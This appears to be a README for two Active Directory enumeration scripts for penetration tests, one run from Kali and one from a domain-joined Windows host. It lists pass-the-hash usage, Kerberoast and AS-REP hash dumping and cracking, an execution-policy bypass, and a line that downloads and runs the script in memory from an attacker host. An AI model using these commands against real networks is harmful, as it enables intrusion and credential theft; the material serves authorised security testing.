# ad-enum

Two complementary **Active Directory enumeration** scripts for Active Directory engagements. 
Both are **enumeration-only**. Every command is one you would type by hand —
the scripts just chain them, save each output to its own file, and finish with a
ranked summary of what was found and what to do next.

| Script       | Where it runs            | Needs credentials?                         | Tooling |
|--------------|--------------------------|--------------------------------------------|---------|
| `ad-enum.sh` | Kali (remote, over LDAP) | Yes — a domain user (password or NT hash)  | nxc / impacket / certipy / bloodhound-python |
| `ade.ps1`    | On a domain-joined host  | No — reuses the current user's token        | Pure ADSI / .NET (AMSI-safe, nothing downloaded) |

Use `ad-enum.sh` when you already have a credential and are enumerating from
Kali. 
Use `ade.ps1` when you have a reverse shell as an unprivileged domain user
but **no password**.

## `ad-enum.sh` — from Kali

```bash
./ad-enum.sh -i 192.168.50.70 -d corp.com
./ad-enum.sh -i 192.168.50.70 -d corp.com -u jdoe -p 'Password123'
./ad-enum.sh -i 192.168.50.70 -d corp.com -u jdoe -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

```
  -i <ip>        Domain Controller IP                       (required)
  -d <domain>    domain FQDN, e.g. corp.com                 (auto-detected if omitted)
  -u <user>      domain user for authenticated enumeration
  -p <pass>      password for -u
  -H <nthash>    NT hash instead of the password (pass-the-hash)
  -k <file>      username wordlist for kerbrute userenum
  -r <targets>   network for the local-admin sweep (default: the DC /24)
  -w <file>      wordlist for --crack        (default: /usr/share/wordlists/rockyou.txt)
  -o <dir>       output directory (default ./ad-enum-<domain>-<date>)
  -t <sec>       per-command timeout (default 180)
  --crack        crack collected AS-REP / Kerberoast hashes with hashcat + -w
  --no-bh        skip bloodhound-python collection
  --no-sweep     skip the local-admin sweep (single credential, no lockout risk)
  --no-spider    skip the share / SYSVOL file spider
  -h             this help
```

Expects on `PATH`: `nxc`, impacket suite, `certipy`, `bloodhound-python`, `kerbrute`, `hashcat`.

## `ade.ps1` — on a domain-joined Windows host

```powershell
powershell -ep bypass -f ade.ps1
powershell -ep bypass -f ade.ps1 -OutDir C:\Users\Public\ade
# in-memory:
IEX(New-Object Net.WebClient).DownloadString('http://KALI/ade.ps1')
```

| Parameter   | Meaning |
|-------------|---------|
| `-OutDir`   | output folder (one file per check) |
| `-Domain`   | override the naming context, e.g. `corp.com` |
| `-SkipAcl`  | skip the ACL scan (the slowest part) |
| `-Roast`    | actively request TGS / AS-REP and dump crackable hashes |
| `-Quiet`    | summary only, no per-check lines |

## License

[MIT](LICENSE)
